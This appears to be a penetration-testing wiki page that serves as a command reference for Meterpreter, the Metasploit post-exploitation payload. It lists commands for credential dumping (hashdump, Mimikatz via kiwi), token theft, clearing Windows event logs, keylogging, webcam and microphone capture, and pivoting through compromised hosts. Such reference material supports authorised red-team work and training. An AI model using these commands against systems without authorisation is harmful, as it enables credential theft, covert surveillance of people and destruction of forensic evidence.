---
title: "Meterpreter"
category: "tools"
tags: []
excerpt: "Meterpreter is an advanced Metasploit payload that runs entirely in memory on the target system — no files are written..."
date: "2026-04-12"
---

---
## Overview
Meterpreter is an advanced Metasploit payload that runs entirely in memory on the target system — no files are written to disk. It communicates over an encrypted TLS channel, making it harder for IPS/IDS systems to detect and inspect. Once a Meterpreter session is established, a wide range of post-exploitation capabilities are available: file system access, privilege escalation, credential dumping, lateral movement, surveillance, and extension loading. Meterpreter sessions are opened from [MSFConsole](/tools/Frameworks/Metasploit/MSFConsole) and managed from within the active session prompt.

## Target / Context
Post-exploitation on compromised Windows or Linux targets. Delivered as a staged or stageless payload via [MSFVenom](/tools/Frameworks/Metasploit/MSFVenom) or directly through an exploit module in [MSFConsole](/tools/Frameworks/Metasploit/MSFConsole). Part of the [Metasploit](/tools/Frameworks/Metasploit/Metasploit) framework.

---
## Installation

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Installation Commands:</span></summary>
<div class="callout-body">

Meterpreter is a payload — it is deployed to the target, not installed locally.
It is included with Metasploit Framework: <code>sudo apt install metasploit-framework</code>

Meterpreter sessions are opened automatically when an exploit using a Meterpreter payload succeeds.
Interact with an existing session: <code>sessions -i <number></code>

</div>
</details>

---
## Basic Usage

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Basic Usage:</span></summary>
<div class="callout-body">

Once inside a Meterpreter session:
<code>sysinfo</code> — identify OS, hostname, and architecture
<code>getuid</code> — confirm current user context
<code>getpid</code> — get the PID of the Meterpreter process
<code>help</code> — list all available Meterpreter commands

</div>
</details>

---
## Flags & Options

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags & Options:</span></summary>
<div class="callout-body">

Meterpreter uses interactive commands rather than CLI flags.
All commands are run from within an active Meterpreter session prompt (<code>meterpreter ></code>).

</div>
</details>

---
## Common Use Cases

### Core Session Commands

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>background</code> — send session to background; return to MSFConsole (also <code>CTRL+Z</code>)
<code>sessions</code> — list all active sessions from MSFConsole
<code>sessions -i <number></code> — return to a backgrounded session
<code>exit</code> — terminate the Meterpreter session
<code>guid</code> — display the session's globally unique identifier
<code>migrate <PID></code> — move Meterpreter into another running process
<code>load <extension></code> — load a Meterpreter extension (e.g., kiwi, python)
<code>run <script or post module></code> — execute a Meterpreter script or post module

<code>migrate</code> use cases: gain stability if the initial process is likely to terminate; move to a process with higher privileges; move to <code>explorer.exe</code> or <code>svchost.exe</code> to blend in.

</div>
</details>

---

### File System Commands

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>ls</code> / <code>dir</code> — list directory contents
<code>pwd</code> — print current remote working directory
<code>cd <path></code> — change remote directory
<code>cat <file></code> — display file contents
<code>edit <file></code> — open file in an editor
<code>rm <file></code> — delete a file
<code>search -f <filename></code> — search for a file by name across the filesystem
<code>upload <local file> <remote path></code> — upload a file to the target
<code>download <remote file></code> — download a file from the target
<code>lcd <path></code> — change local working directory
<code>lpwd</code> — print local working directory

</div>
</details>

---

### Networking Commands

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>arp</code> — display the ARP cache (reveals other hosts on the network)
<code>ifconfig</code> — list network interfaces and IP addresses
<code>netstat</code> — display active network connections and listening ports
<code>portfwd add -l <local port> -p <remote port> -r <remote IP></code> — forward a local port to a remote service
<code>route</code> — view or modify the routing table

<code>portfwd</code> is used to pivot — forward traffic through the compromised host to access internal services not directly reachable from the attacker's machine.

</div>
</details>

---

### System Commands

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>sysinfo</code> — display OS name, hostname, architecture, and Meterpreter version
<code>getuid</code> — show current user (e.g., <code>NT AUTHORITY\SYSTEM</code>)
<code>getpid</code> — show the PID of the current Meterpreter process
<code>ps</code> — list all running processes with PID, name, user, and path
<code>kill <PID></code> — terminate a process by PID
<code>pkill <name></code> — terminate a process by name
<code>execute -f <command></code> — run a command on the target
<code>shell</code> — drop into a system command shell; press <code>CTRL+Z</code> to return to Meterpreter
<code>getsystem</code> — attempt automated privilege escalation to SYSTEM
<code>hashdump</code> — dump the Windows SAM database (local user password hashes)
<code>clearev</code> — clear Windows event logs (Application, System, Security)
<code>reboot</code> — reboot the target system
<code>shutdown</code> — shut down the target system

<code>hashdump</code> requires SYSTEM privileges — migrate to <code>lsass.exe</code> first, or use <code>getsystem</code> to escalate.
<code>getsystem</code> attempts several escalation techniques automatically; may fail if the system is hardened.
<code>shell</code> gives a native OS shell. Type <code>exit</code> to close it and return to Meterpreter.
<code>steal_token <PID></code> — impersonate the access token of a running process; useful for taking on the privilege context of a higher-privileged user without migrating into their process. Run <code>ps</code> first to find an appropriate PID.

</div>
</details>

---

### Surveillance Commands

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

<code>idletime</code> — show how long the user has been idle
<code>screenshot</code> — capture a screenshot of the active desktop
<code>screenshare</code> — stream the live desktop to your browser
<code>record_mic</code> — record audio from the microphone
<code>webcam_list</code> — list available webcams
<code>webcam_snap</code> — capture a photo from the webcam
<code>webcam_stream</code> — stream live video from the webcam
<code>keyscan_start</code> — start keylogging
<code>keyscan_dump</code> — dump captured keystrokes
<code>keyscan_stop</code> — stop keylogging

<code>keyscan_start</code> requires migrating to the target user's process first (e.g., explorer.exe) — otherwise keystrokes from the correct session won't be captured.

</div>
</details>

---

### Extensions

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

Load an extension: <code>load <name></code>
Show new commands added: <code>help</code>

**Kiwi** (Mimikatz integration for Windows credential dumping):
<ul class="callout-list">
  <li><code>load kiwi</code></li>
</ul>
<code>creds_all</code> — dump all credential types
<code>lsa_dump_sam</code> — dump SAM database
<code>lsa_dump_secrets</code> — dump LSA secrets

**Python** (run Python in the context of the target):
<ul class="callout-list">
  <li><code>load python</code></li>
</ul>
<code>python_execute "<code>"</code> — execute a Python one-liner
<code>python_import <file></code> — import and run a Python script
<code>python_reset</code> — reset the Python interpreter state

</div>
</details>

---

### Post-Exploitation Modules
Run post modules directly from within a Meterpreter session or from MSFConsole with `SESSION` set.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
<div class="callout-body">

From MSFConsole:
<ul class="callout-list">
  <li><code>use post/linux/gather/hashdump</code></li>
  <li><code>set SESSION 1</code></li>
  <li><code>run</code></li>
</ul>

Convert a basic shell session to Meterpreter:
<ul class="callout-list">
  <li><code>use post/multi/manage/shell_to_meterpreter</code></li>
  <li><code>set SESSION 1</code></li>
  <li><code>run</code></li>
</ul>

Identify local privilege escalation paths on the current session:
<ul class="callout-list">
  <li><code>use post/multi/recon/local_exploit_suggester</code></li>
  <li><code>set SESSION 1</code></li>
  <li><code>run</code></li>
</ul>
— Scans the target against known local exploits for the current OS and architecture. Not all suggestions will work; run each candidate and try the next if it fails.

Windows credential targeting:
Migrate to <code>lsass.exe</code> → <code>hashdump</code> or <code>load kiwi</code> → <code>creds_all</code>

</div>
</details>

---
## Related Techniques
-

## Related Playbooks
- [Red Team](/playbooks/Methodologies/Red-Team)

---
## References / Images
- LSASS Memory and hashdump context: https://redcanary.com/threat-detection-report/techniques/lsass-memory/
- Metasploit Unleashed: https://www.offsec.com/metasploit-unleashed/
